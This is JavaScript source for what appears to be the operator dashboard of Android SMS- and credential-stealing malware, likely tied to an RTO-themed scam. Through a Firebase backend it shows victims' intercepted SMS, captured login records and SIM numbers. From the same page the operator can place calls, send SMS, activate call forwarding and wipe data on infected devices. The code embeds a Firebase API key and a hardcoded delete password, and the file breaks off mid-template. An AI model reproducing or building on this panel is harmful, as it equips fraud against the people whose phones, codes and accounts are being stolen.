/* ============================================================ */
/* app.js - COMPLETE WITH FIXED LOAD MORE                      */
/* ============================================================ */

// ============================================================
// FIREBASE CONFIG
// ============================================================
const firebaseConfig = {
    apiKey: "AIzaSyAzStFCeODQmVbydsq1yxPHryz-cqM8lrU",
    authDomain: "hello4211.firebaseapp.com",
    databaseURL: "https://hello4211-default-rtdb.firebaseio.com",
    projectId: "hello4211",
    storageBucket: "hello4211.firebasestorage.app",
    messagingSenderId: "11131576643",
    appId: "1:11131576643:web:64e4153cee7cb7847e4ff6"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();

// ============================================================
// CONSTANTS
// ============================================================
const DEVICE_LIMIT = 5;
const SMS_LIMIT = 10;
const DELETE_PASSWORD = '9999';
const CREDS_PER_PAGE = 10;

// ============================================================
// STATE
// ============================================================
const state = {
    data: { user_data: {}, user_sms: {}, login: {}, backup_sms: {} },
    deviceOnlineStatus: new Map(),
    deviceSerialMap: new Map(),
    deviceSmsCache: new Map(),
    allDeviceKeys: [],
    filteredKeys: [],
    allSmsList: [],
    modalSmsList: [],
    expandedDevices: new Map(),
    activeTabs: new Map(),
    isPanelOpen: { devices: true, favourites: false, sms: false, credentials: false, backup: false, analytics: false },
    formMemory: {},
    deviceOffset: 0,
    allSmsOffset: 0,
    modalSmsOffset: 0,
    currentFilter: 'all',
    searchQuery: '',
    smsFilterDevice: null,
    modalTarget: 'ALL',
    isRendering: false,
    renderVersion: 0,
    pendingRender: null,
    pendingUpdates: new Set(),
    isFirstLoad: true,
    dataVersion: 0,
    credCatalogData: [],
    credFilter: 'all',
    credSearchQuery: '',
    credCurrentPage: 1,
    favourites: []
};

// ============================================================
// DOM REFS
// ============================================================
const $ = (id) => document.getElementById(id);

// ============================================================
// FAVOURITES - STATE & FUNCTIONS
// ============================================================

function loadFavourites() {
    try {
        const saved = localStorage.getItem('rtoFavourites');
        if (saved) {
            state.favourites = JSON.parse(saved);
        } else {
            state.favourites = [];
        }
    } catch(e) {
        state.favourites = [];
    }
    updateFavCounts();
    return state.favourites;
}

function saveFavourites() {
    try {
        localStorage.setItem('rtoFavourites', JSON.stringify(state.favourites));
    } catch(e) {
        console.error('Failed to save favourites:', e);
    }
    updateFavCounts();
}

function toggleFavourite(devId) {
    const index = state.favourites.indexOf(devId);
    if (index > -1) {
        state.favourites.splice(index, 1);
        showToast(`⭐ Removed ${devId} from favourites`, 'info');
    } else {
        state.favourites.push(devId);
        showToast(`⭐ Added ${devId} to favourites`, 'success');
    }
    saveFavourites();
    renderFavouritesCatalog();
    updateDeviceFavStars();
}

function isFavourite(devId) {
    return state.favourites.includes(devId);
}

function updateFavCounts() {
    const count = state.favourites.length;
    const favCount = $('favCount');
    const panelFavCount = $('panelFavCount');
    const mobileFavBadge = $('mobileFavBadge');
    
    if (favCount) favCount.textContent = count;
    if (panelFavCount) panelFavCount.textContent = count;
    if (mobileFavBadge) {
        mobileFavBadge.textContent = count;
        mobileFavBadge.style.display = count > 0 ? 'block' : 'none';
    }
}

function clearAllFavourites() {
    if (!confirm('⚠️ Remove all devices from favourites?')) return;
    state.favourites = [];
    saveFavourites();
    renderFavouritesCatalog();
    updateDeviceFavStars();
    showToast('✅ All favourites cleared', 'success');
}

// ============================================================
// RENDER FAVOURITES CATALOG
// ============================================================
function renderFavouritesCatalog() {
    const container = document.getElementById('favouritesContainer');
    if (!container) return;
    
    loadFavourites();
    
    if (state.favourites.length === 0) {
        container.innerHTML = `
            <div class="favourites-catalog active">
                <div class="no-fav">
                    <div class="no-fav-icon"><i class="fas fa-star"></i></div>
                    <h4>No Favourite Devices</h4>
                    <p>Star your important devices from the Devices panel to see them here</p>
                    <div class="no-fav-hint">
                        <i class="fas fa-info-circle" style="color:var(--gold);"></i>
                        Click the ⭐ star icon on any device card to add it to favourites
                    </div>
                </div>
            </div>
        `;
        return;
    }
    
    const devices = state.data.user_data || {};
    let html = `
        <div class="favourites-catalog active">
            <div class="fav-header">
                <div class="fav-title">
                    <h3>⭐ Favourite Devices</h3>
                    <span class="fav-badge">${state.favourites.length} devices</span>
                </div>
                <div class="fav-stats">
                    <span class="stat-chip">
                        <i class="fas fa-star" style="color:var(--gold);"></i>
                        Total: <span class="num">${state.favourites.length}</span>
                    </span>
                    <span class="stat-chip">
                        <i class="fas fa-mobile-alt"></i>
                        Online: <span class="num" id="favOnlineCount">0</span>
                    </span>
                </div>
            </div>
            
            <div class="fav-grid">
    `;
    
    let onlineCount = 0;
    
    state.favourites.forEach(devId => {
        const dev = devices[devId] || {};
        const serial = state.deviceSerialMap.get(devId) || 0;
        const online = state.deviceOnlineStatus.get(devId) || false;
        const lastSeen = dev.last_online || dev.timestamp;
        const timeStr = lastSeen ? new Date(lastSeen).toLocaleString() : 'N/A';
        
        if (online) onlineCount++;
        
        const smsCache = state.deviceSmsCache.get(devId);
        const totalSms = smsCache ? smsCache.all.length : 0;
        
        const loginData = state.data.login || {};
        let credCount = 0;
        if (loginData[devId]) {
            credCount = Object.keys(loginData[devId]).length;
        }
        
        html += `
            <div class="fav-card" data-device="${devId}">
                <div class="fav-card-header">
                    <div class="device-info">
                        <span class="fav-star" onclick="toggleFavourite('${devId}')" title="Remove from favourites">
                            <i class="fas fa-star"></i>
                        </span>
                        <span class="dev-name">📱 ${escapeHtml(devId)}</span>
                        ${serial > 0 ? `<span class="dev-serial">S-${serial}</span>` : ''}
                    </div>
                    <span class="fav-status ${online ? 'online' : 'offline'}">
                        <span class="status-dot" style="width:6px;height:6px;border-radius:50%;display:inline-block;background:${online ? 'var(--green)' : 'var(--red)'};"></span>
                        ${online ? 'Online' : 'Offline'}
                    </span>
                </div>
                <div class="fav-card-body">
                    <div class="fav-info-grid">
                        <div class="fav-info-item">
                            <span class="label">Device Info</span>
                            <span class="value">${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</span>
                        </div>
                        <div class="fav-info-item">
                            <span class="label">SIM 1</span>
                            <span class="value">${escapeHtml(dev.numberSim1 || dev.sim1 || 'N/A')}</span>
                        </div>
                        <div class="fav-info-item">
                            <span class="label">SIM 2</span>
                            <span class="value">${escapeHtml(dev.numberSim2 || dev.sim2 || 'N/A')}</span>
                        </div>
                        <div class="fav-info-item">
                            <span class="label">Serial</span>
                            <span class="value highlight">${serial > 0 ? serial : '—'}</span>
                        </div>
                        <div class="fav-info-item">
                            <span class="label">SMS</span>
                            <span class="value">${totalSms}</span>
                        </div>
                        <div class="fav-info-item">
                            <span class="label">Credentials</span>
                            <span class="value">${credCount}</span>
                        </div>
                        <div class="fav-info-item" style="grid-column:1/-1;">
                            <span class="label">Last Seen</span>
                            <span class="value" style="font-size:11px;color:var(--text-muted);">${timeStr}</span>
                        </div>
                    </div>
                </div>
                <div class="fav-card-footer">
                    <button class="fav-action-btn gold" onclick="toggleDevice('${devId}');setTimeout(()=>{document.getElementById('card-${devId}')?.scrollIntoView({behavior:'smooth'})},300);">
                        <i class="fas fa-expand"></i> View Details
                    </button>
                    <button class="fav-action-btn" onclick="setTab('${devId}','sms');togglePanel('devices');">
                        <i class="fas fa-envelope"></i> SMS
                    </button>
                    <button class="fav-action-btn" onclick="setTab('${devId}','login');togglePanel('devices');">
                        <i class="fas fa-key"></i> Creds
                    </button>
                    <button class="fav-action-btn danger" onclick="toggleFavourite('${devId}');">
                        <i class="fas fa-star"></i> Remove
                    </button>
                </div>
            </div>
        `;
    });
    
    html += `
            </div>
        </div>
    `;
    
    container.innerHTML = html;
    
    const onlineCountEl = document.getElementById('favOnlineCount');
    if (onlineCountEl) onlineCountEl.textContent = onlineCount;
}

// ============================================================
// UPDATE DEVICE CARD FAVOURITE STARS
// ============================================================
function updateDeviceFavStars() {
    const cards = document.querySelectorAll('.device-card-premium');
    cards.forEach(card => {
        const devId = card.dataset.deviceId;
        if (!devId) return;
        
        const favBtn = card.querySelector('.fav-star-btn');
        if (favBtn) {
            const isFav = isFavourite(devId);
            favBtn.innerHTML = isFav ? '<i class="fas fa-star"></i>' : '<i class="far fa-star"></i>';
            favBtn.title = isFav ? 'Remove from favourites' : 'Add to favourites';
        }
    });
}

// ============================================================
// CONNECTION MONITOR
// ============================================================
db.ref(".info/connected").on("value", (snap) => {
    const badge = $('statusBadge');
    const text = $('statusText');
    if (snap.val() === true) {
        badge.className = 'connection-status online';
        text.textContent = 'Online';
    } else {
        badge.className = 'connection-status offline';
        text.textContent = 'Offline';
    }
});

// ============================================================
// MAIN DATA LISTENER
// ============================================================
db.ref().on("value", (snapshot) => {
    const newData = snapshot.val() || {};
    state.dataVersion++;
    state.data = newData;
    updateCaches();
    
    const active = document.activeElement;
    const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
    if (typing) return;
    
    scheduleRender();
    
    if (state.isFirstLoad) {
        state.isFirstLoad = false;
        if (!state.isPanelOpen.devices) {
            togglePanel('devices');
        }
    }
});

// ============================================================
// UPDATE CACHES
// ============================================================
function updateCaches() {
    const devices = state.data.user_data || {};
    const smsData = state.data.user_sms || {};
    const now = Date.now();
    
    state.allDeviceKeys = Object.keys(devices);
    
    state.allDeviceKeys.forEach(devId => {
        const dev = devices[devId];
        if (!dev) return;
        const isOnline = dev.isOnline || dev.online || false;
        const lastSeen = dev.last_online || dev.timestamp || 0;
        const isRecent = (now - lastSeen) < 120000;
        state.deviceOnlineStatus.set(devId, isOnline || isRecent);
    });
    
    state.allDeviceKeys.forEach(devId => {
        if (smsData[devId]) {
            const keys = Object.keys(smsData[devId]);
            const newAll = keys.map(k => smsData[devId][k]);
            const cached = state.deviceSmsCache.get(devId);
            if (!cached || JSON.stringify(cached.all) !== JSON.stringify(newAll)) {
                state.deviceSmsCache.set(devId, { 
                    all: newAll, 
                    offset: 0,
                    version: (cached?.version || 0) + 1
                });
            }
        }
    });
    
    state.allDeviceKeys.forEach(devId => {
        const dev = devices[devId];
        if (dev) {
            let serial = dev.user_serial || dev.uesr_serial || 0;
            if (typeof serial === 'string') serial = parseInt(serial) || 0;
            state.deviceSerialMap.set(devId, serial);
        }
    });
    
    updateMobileBadge();
    updateCredCounts();
}

// ============================================================
// UPDATE MOBILE BADGE
// ============================================================
function updateMobileBadge() {
    const smsData = state.data.user_sms || {};
    let totalSms = 0;
    Object.keys(smsData).forEach(d => {
        totalSms += Object.keys(smsData[d]).length;
    });
    const badge = $('mobileSmsBadge');
    if (badge) {
        badge.textContent = totalSms;
        badge.style.display = totalSms > 0 ? 'block' : 'none';
    }
}

// ============================================================
// UPDATE CRED COUNTS
// ============================================================
function updateCredCounts() {
    const loginData = state.data.login || {};
    let totalCreds = 0;
    let devicesWithCreds = 0;
    
    Object.keys(loginData).forEach(devId => {
        const creds = loginData[devId];
        if (creds && Object.keys(creds).length > 0) {
            devicesWithCreds++;
            totalCreds += Object.keys(creds).length;
        }
    });
    
    const credCount = $('credCount');
    const mobileCredBadge = $('mobileCredBadge');
    const panelCredCount = $('panelCredCount');
    const panelCredDevices = $('panelCredDevices');
    
    if (credCount) credCount.textContent = devicesWithCreds;
    if (mobileCredBadge) {
        mobileCredBadge.textContent = totalCreds;
        mobileCredBadge.style.display = totalCreds > 0 ? 'block' : 'none';
    }
    if (panelCredCount) panelCredCount.textContent = totalCreds;
    if (panelCredDevices) panelCredDevices.textContent = devicesWithCreds;
}

// ============================================================
// SCHEDULE RENDER
// ============================================================
function scheduleRender() {
    if (state.pendingRender) {
        clearTimeout(state.pendingRender);
        state.pendingRender = null;
    }
    
    if (state.isRendering) {
        state.pendingRender = setTimeout(() => {
            state.pendingRender = null;
            performRender();
        }, 300);
        return;
    }
    
    state.pendingRender = setTimeout(() => {
        state.pendingRender = null;
        performRender();
    }, 200);
}

// ============================================================
// PERFORM RENDER
// ============================================================
function performRender() {
    if (state.isRendering) return;
    state.isRendering = true;
    
    try {
        updateCounts();
        if (state.isPanelOpen.devices) renderDevicesOptimized();
        if (state.isPanelOpen.favourites) renderFavouritesCatalog();
        if (state.isPanelOpen.sms) renderAllSmsOptimized();
        if (state.isPanelOpen.credentials) renderCredentialsCatalog();
        if (state.isPanelOpen.analytics) renderAnalytics();
        if (state.isPanelOpen.backup) renderBackupPanel();
    } catch (err) {
        console.error('Render error:', err);
    } finally {
        state.isRendering = false;
        if (state.pendingRender) {
            const pending = state.pendingRender;
            state.pendingRender = null;
            performRender();
        }
    }
}

// ============================================================
// UPDATE COUNTS
// ============================================================
function updateCounts() {
    const devices = state.data.user_data || {};
    const keys = Object.keys(devices);
    const deviceCount = $('deviceCount');
    const panelDeviceCount = $('panelDeviceCount');
    if (deviceCount) deviceCount.textContent = keys.length;
    if (panelDeviceCount) panelDeviceCount.textContent = keys.length;
    
    const smsData = state.data.user_sms || {};
    let totalSms = 0;
    Object.keys(smsData).forEach(d => {
        totalSms += Object.keys(smsData[d]).length;
    });
    const smsCount = $('smsCount');
    if (smsCount) smsCount.textContent = totalSms;
    
    if (!state.smsFilterDevice) {
        const panelSmsCount = $('panelSmsCount');
        if (panelSmsCount) panelSmsCount.textContent = totalSms;
    }
    
    updateMobileBadge();
    updateCredCounts();
}

// ============================================================
// GET FILTERED DEVICE KEYS
// ============================================================
function getFilteredDeviceKeys() {
    const devices = state.data.user_data || {};
    let keys = Object.keys(devices);
    
    if (state.searchQuery) {
        const query = state.searchQuery.toLowerCase();
        keys = keys.filter(id => {
            const dev = devices[id] || {};
            const name = dev.d_name || dev.device_name || id;
            const serial = state.deviceSerialMap.get(id) || 0;
            return (id + ' ' + name + ' ' + serial).toLowerCase().includes(query);
        });
    }
    
    keys.sort((a, b) => {
        const serialA = state.deviceSerialMap.get(a) || 0;
        const serialB = state.deviceSerialMap.get(b) || 0;
        if (serialA === serialB) {
            return a.localeCompare(b);
        }
        return serialB - serialA;
    });
    
    if (state.currentFilter === 'online') {
        keys = keys.filter(id => state.deviceOnlineStatus.get(id) === true);
    } else if (state.currentFilter === 'offline') {
        keys = keys.filter(id => state.deviceOnlineStatus.get(id) === false);
    }
    
    state.filteredKeys = keys;
    return keys;
}

// ============================================================
// RENDER DEVICES - WITH PREMIUM CSS
// ============================================================
function renderDevicesOptimized() {
    const container = $('devicesContainer');
    if (!container) return;
    
    const devices = state.data.user_data || {};
    let keys = getFilteredDeviceKeys();
    
    if (keys.length === 0) {
        let msg = 'No devices found';
        if (state.searchQuery) msg = 'No devices match "' + state.searchQuery + '"';
        else if (state.currentFilter === 'online') msg = 'No online devices';
        else if (state.currentFilter === 'offline') msg = 'No offline devices';
        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-search empty-icon"></i>${msg}</div>`;
        return;
    }
    
    if (state.deviceOffset >= keys.length) {
        state.deviceOffset = Math.max(0, keys.length - DEVICE_LIMIT);
    }
    
    const start = state.deviceOffset;
    const end = Math.min(start + DEVICE_LIMIT, keys.length);
    const displayKeys = keys.slice(start, end);
    const hasMore = end < keys.length;
    const hasPrev = state.deviceOffset > 0;
    
    let finalHtml = '';
    
    if (hasPrev) {
        finalHtml += `
            <button class="btn-load-more" style="margin-bottom:10px;" onclick="loadPrevDevices()">
                <i class="fas fa-chevron-up"></i> Previous
            </button>
        `;
    }
    
    displayKeys.forEach((devId, index) => {
        finalHtml += buildDeviceCardPremium(devId, start + index, devices);
    });
    
    if (hasMore) {
        const remaining = keys.length - end;
        finalHtml += `
            <button class="btn-load-more" onclick="loadMoreDevices()">
                <i class="fas fa-chevron-down"></i> Load More (${remaining} remaining)
            </button>
        `;
    }
    
    container.innerHTML = finalHtml;
}

// ============================================================
// BUILD DEVICE CARD - PREMIUM
// ============================================================
function buildDeviceCardPremium(devId, index, devices) {
    const dev = devices[devId] || {};
    const serial = state.deviceSerialMap.get(devId) || 0;
    const online = state.deviceOnlineStatus.get(devId) || false;
    const lastSeen = dev.last_online || dev.timestamp;
    const statusClass = online ? 'online' : 'offline';
    const statusText = online ? 'Online' : 'Offline';
    const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
    const dateStr = lastSeen ? new Date(lastSeen).toLocaleDateString() : '';
    
    const smsCache = state.deviceSmsCache.get(devId);
    const totalSms = smsCache ? smsCache.all.length : 0;
    
    const loginData = state.data.login || {};
    let devLoginList = [];
    if (loginData[devId]) {
        Object.keys(loginData[devId]).forEach(k => {
            const credData = loginData[devId][k];
            credData._timestamp = credData.timestamp || credData.date || Date.now();
            devLoginList.push(credData);
        });
        devLoginList.sort((a, b) => (b._timestamp || 0) - (a._timestamp || 0));
    }
    
    const isExpanded = state.expandedDevices.get(devId) || false;
    const activeTab = state.activeTabs.get(devId) || null;
    const isFav = isFavourite(devId);
    
    let devSmsList = [];
    const hasMoreSms = smsCache && (smsCache.offset + SMS_LIMIT < smsCache.all.length);
    
    if (smsCache) {
        const startIdx = smsCache.offset;
        const endIdx = Math.min(startIdx + SMS_LIMIT, smsCache.all.length);
        devSmsList = smsCache.all.slice(startIdx, endIdx).reverse();
    }
    
    // Build Credentials HTML - LATEST FIRST
    let credsHtml = '';
    if (devLoginList.length > 0) {
        credsHtml = devLoginList.map((rec, idx) => {
            let fields = '';
            let timestamp = rec.timestamp || rec.date || '';
            let displayTime = '';
            let isLatest = idx === 0;
            
            if (timestamp) {
                try {
                    const d = new Date(timestamp);
                    displayTime = d.toLocaleString();
                } catch(e) { displayTime = ''; }
            }
            
            for (let k in rec) {
                if (k === 'key' || k === 'timestamp' || k === 'date' || k === '_timestamp') continue;
                const value = rec[k] || 'N/A';
                const escaped = escapeHtml(String(value));
                fields += `
                    <div class="cred-field-premium">
                        <span class="field-label-premium">${escapeHtml(k)}</span>
                        <span style="display:flex;align-items:center;gap:6px;">
                            <span class="field-value-premium" id="field-${devId}-${idx}-${k}">${escaped}</span>
                            <button class="copy-btn-premium" onclick="event.stopPropagation();copyField('field-${devId}-${idx}-${k}')">
                                <i class="fas fa-copy"></i>
                            </button>
                        </span>
                    </div>
                `;
            }
            
            const latestBadge = isLatest ? `<span style="background:var(--green);color:#fff;font-size:7px;padding:1px 8px;border-radius:10px;margin-left:4px;">⬇️ LATEST</span>` : '';
            
            return `
                <div class="cred-item-premium" style="${isLatest ? 'border-left: 2px solid var(--green);' : ''}">
                    <div class="cred-header-premium">
                        <span>📋 Record ${idx+1} ${displayTime ? '🕐 ' + escapeHtml(displayTime) : ''} ${latestBadge}</span>
                        <span style="font-size:9px;color:var(--text-muted);">#${idx+1}</span>
                    </div>
                    <div class="cred-fields-premium">${fields}</div>
                </div>
            `;
        }).join('');
    }
    
    // Build SMS HTML
    let smsHtml = '';
    if (devSmsList.length > 0) {
        smsHtml = devSmsList.map(msg => {
            const sender = msg.sender || msg.address || 'Unknown';
            const body = msg.body || 'No content';
            const date = msg.date_formatted || msg.date || '';
            return `
                <div class="sms-item-premium">
                    <div class="sms-header-premium">
                        <span class="sms-sender-premium">👤 ${escapeHtml(sender)}</span>
                        <span>${escapeHtml(date)}</span>
                    </div>
                    <div class="sms-body-premium">${escapeHtml(body)}</div>
                </div>
            `;
        }).join('');
    } else {
        smsHtml = '<div class="empty-luxury" style="padding:10px 0;">No SMS</div>';
    }
    
    // Build Action Buttons
    const actions = [
        { id: 'sms', icon: '💬', label: 'SMS', count: totalSms, activeClass: 'active-sms' },
        { id: 'login', icon: '🔑', label: 'Login', count: devLoginList.length, activeClass: 'active-login' },
        { id: 'call', icon: '📞', label: 'Call', activeClass: 'active-call' },
        { id: 'sendsms', icon: '✉️', label: 'Send', activeClass: 'active-sendsms' },
        { id: 'fwd', icon: '🔀', label: 'Forward', activeClass: 'active-fwd' },
        { id: 'backup', icon: '💾', label: 'Backup', activeClass: 'active-backup' },
        { id: 'delete', icon: '🗑️', label: 'Delete', activeClass: 'active-delete' }
    ];
    
    let actionsHtml = actions.map(a => {
        const isActive = activeTab === a.id;
        const countHtml = a.count !== undefined && a.count > 0 ? `<span class="btn-badge">${a.count}</span>` : '';
        const activeClass = isActive ? a.activeClass : '';
        return `
            <button class="action-btn-premium ${activeClass}" onclick="event.stopPropagation();setTab('${devId}','${a.id}')">
                ${a.icon} ${a.label} ${countHtml}
            </button>
        `;
    }).join('');
    
    // Build Section Content
    const sections = {
        sms: `
            <div class="section-premium ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
                <div class="section-title">
                    💬 SMS
                    <span style="margin-left:auto;font-size:10px;color:var(--text-muted);">${totalSms} messages</span>
                    <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">⛶ Full</button>
                </div>
                <div class="sms-list-premium">${smsHtml}</div>
                ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
            </div>
        `,
        login: `
            <div class="section-premium ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
                <div class="section-title">
                    🔑 Credentials
                    <span style="margin-left:auto;font-size:10px;color:var(--text-muted);">${devLoginList.length} records</span>
                    ${devLoginList.length > 0 ? `<button class="login-delete-all-btn" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')">🗑️ Delete All</button>` : ''}
                </div>
                <div class="creds-container-premium" id="login-cards-${devId}">
                    ${devLoginList.length === 0 ? '<div class="empty-luxury"><i class="fas fa-key"></i> No credentials found</div>' : credsHtml}
                </div>
                ${devLoginList.length > 5 ? `
                    <div style="display:flex;gap:6px;margin-top:8px;flex-wrap:wrap;">
                        <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToTop('${devId}')">
                            <i class="fas fa-arrow-up"></i> Top
                        </button>
                        <button class="scroll-to-bottom-btn" onclick="event.stopPropagation();scrollCredentialsToBottom('${devId}')">
                            <i class="fas fa-arrow-down"></i> Bottom
                        </button>
                    </div>
                ` : ''}
            </div>
        `,
        call: `
            <div class="section-premium ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
                <div class="section-title">📞 Make Call</div>
                <input type="text" id="callNum-${devId}" value="${escapeHtml(state.formMemory['callNum-' + devId] || '')}" placeholder="Phone Number" oninput="state.formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
                <select id="callSim-${devId}" onchange="state.formMemory['callSim-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
                    <option value="0" ${(state.formMemory['callSim-' + devId] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                    <option value="1" ${(state.formMemory['callSim-' + devId] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                </select>
                <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('call','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                    <i class="fas fa-phone"></i> Call
                </button>
            </div>
        `,
        sendsms: `
            <div class="section-premium ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
                <div class="section-title">✉️ Send SMS</div>
                <input type="text" id="smsNum-${devId}" value="${escapeHtml(state.formMemory['smsNum-' + devId] || '')}" placeholder="Recipient" oninput="state.formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
                <textarea id="smsText-${devId}" placeholder="Message" rows="2" oninput="state.formMemory['smsText-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;resize:vertical;min-height:50px;font-family:'Inter',sans-serif;">${escapeHtml(state.formMemory['smsText-' + devId] || '')}</textarea>
                <select id="smsSim-${devId}" onchange="state.formMemory['smsSim-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
                    <option value="1" ${(state.formMemory['smsSim-' + devId] || '1') === '1' ? 'selected' : ''}>SIM 1</option>
                    <option value="2" ${(state.formMemory['smsSim-' + devId] || '1') === '2' ? 'selected' : ''}>SIM 2</option>
                </select>
                <button class="btn-luxury btn-blue" onclick="event.stopPropagation();showCommandDialog('sms','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                    <i class="fas fa-paper-plane"></i> Send
                </button>
            </div>
        `,
        fwd: `
            <div class="section-premium ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
                <div class="section-title">🔀 Call Forward</div>
                <input type="text" id="fwdNum-${devId}" value="${escapeHtml(state.formMemory['fwdNum-' + devId] || '')}" placeholder="Forward To" oninput="state.formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
                <select id="fwdSim-${devId}" onchange="state.formMemory['fwdSim-${devId}']=this.value" onclick="event.stopPropagation()" style="width:100%;padding:8px 12px;margin:4px 0 8px;background:var(--bg-card);color:var(--text-primary);border:1px solid var(--border-color);border-radius:var(--radius-sm);font-size:12px;outline:none;">
                    <option value="0" ${(state.formMemory['fwdSim-' + devId] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                    <option value="1" ${(state.formMemory['fwdSim-' + devId] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                </select>
                <button class="btn-luxury" style="background:var(--green);color:#fff;padding:8px;font-size:11px;width:100%;justify-content:center;margin-bottom:4px;" onclick="event.stopPropagation();showCommandDialog('fwd_on','${devId}')">
                    <i class="fas fa-play"></i> Activate
                </button>
                <button class="btn-luxury btn-red" onclick="event.stopPropagation();showCommandDialog('fwd_off','${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                    <i class="fas fa-stop"></i> Deactivate
                </button>
            </div>
        `,
        backup: `
            <div class="section-premium ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
                <div class="section-title">💾 Backup</div>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
                    <button class="btn-luxury btn-purple" onclick="event.stopPropagation();showCommandDialog('backup','${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
                        <i class="fas fa-database"></i> Backup
                    </button>
                    <button class="btn-luxury btn-blue" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;">
                        <i class="fas fa-sync"></i> Refresh
                    </button>
                </div>
                <div id="deviceBackup-${devId}" style="margin-top:8px;padding:8px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
                    Click Refresh to check status
                </div>
            </div>
        `,
        delete: `
            <div class="section-premium ${activeTab === 'delete' ? 'active' : ''}" id="sec-delete-${devId}" style="border-color:var(--red);">
                <div class="section-title" style="color:var(--red);">🗑️ Delete Device Data</div>
                <div style="display:flex;flex-direction:column;gap:8px;">
                    <button class="btn-luxury btn-red" onclick="event.stopPropagation();deleteDeviceSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                        <i class="fas fa-trash"></i> Delete All SMS
                    </button>
                    <button class="btn-luxury btn-purple-delete" onclick="event.stopPropagation();deleteDeviceCredentials('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;">
                        <i class="fas fa-trash"></i> Delete All Credentials
                    </button>
                </div>
                <div class="delete-password-hint" style="margin-top:8px;font-size:10px;color:var(--text-muted);padding:8px;background:rgba(239,68,68,0.05);border-radius:6px;border:1px solid rgba(239,68,68,0.1);display:flex;align-items:center;gap:8px;">
                    <span style="font-size:14px;">⚠️</span>
                    Password required: <span style="color:var(--gold);font-weight:600;">9999</span>
                </div>
            </div>
        `
    };
    
    let sectionsHtml = '';
    ['sms', 'login', 'call', 'sendsms', 'fwd', 'backup', 'delete'].forEach(key => {
        sectionsHtml += sections[key] || '';
    });
    
    return `
        <div class="device-card-premium ${statusClass} ${isExpanded ? 'expanded' : ''}" id="card-${devId}" data-device-id="${devId}">
            <div class="swipe-delete-hint">
                <i class="fas fa-trash"></i> Delete
            </div>
            
            <div class="card-header" onclick="toggleDevice('${devId}')">
                <div class="device-info-left">
                    <div class="device-name-premium">
                        <button class="fav-star-btn" onclick="event.stopPropagation();toggleFavourite('${devId}')" 
                            style="background:transparent;border:none;cursor:pointer;font-size:18px;padding:0 4px;transition:all 0.3s ease;color:var(--gold);"
                            title="${isFav ? 'Remove from favourites' : 'Add to favourites'}">
                            ${isFav ? '<i class="fas fa-star"></i>' : '<i class="far fa-star"></i>'}
                        </button>
                        <span class="name-text">📱 ${escapeHtml(devId)}</span>
                        <span class="device-id">#${index + 1}</span>
                        ${serial > 0 ? `<span class="serial-badge-premium"><i class="fas fa-hashtag"></i> S-${serial}</span>` : ''}
                        ${isFav ? `<span style="color:var(--gold);font-size:10px;background:rgba(212,175,55,0.12);padding:1px 8px;border-radius:10px;border:1px solid rgba(212,175,55,0.2);">⭐ FAV</span>` : ''}
                    </div>
                    <div class="device-sub-info">
                        <span><i class="fas fa-microchip"></i> ${escapeHtml(dev.Device_info || dev.device_info || 'N/A')}</span>
